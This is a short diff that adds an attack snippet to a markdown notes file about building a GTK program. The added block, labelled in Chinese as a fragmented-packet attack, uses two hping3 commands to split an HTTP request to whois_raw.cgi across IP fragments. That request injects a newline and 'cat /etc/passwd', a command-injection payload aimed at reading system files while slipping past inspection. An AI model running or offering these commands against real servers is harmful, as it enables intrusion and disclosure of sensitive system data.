@@ -67,3 +67,13 @@ gcc -o main_window main_window.c `pkg-config --cflags --libs gtk+-3.0`
 ./main_window
 
 ```
+
+```
+合并报文攻击
+# First fragment
+sudo hping3 -c 1 -d 20 -E <(echo -n "GET /whois_raw.cgi?fqdn=") -p 80 --frag --fragoff 0 --tcp-mss 20 --tcp-timestamp --keep -S example.com
+
+# Second fragment
+sudo hping3 -c 1 -d 20 -E <(echo -n "%0acat%20/etc/passwd") -p 80 --frag --fragoff 20 --tcp-mss 20 --tcp-timestamp --keep -S example.com
+
+```
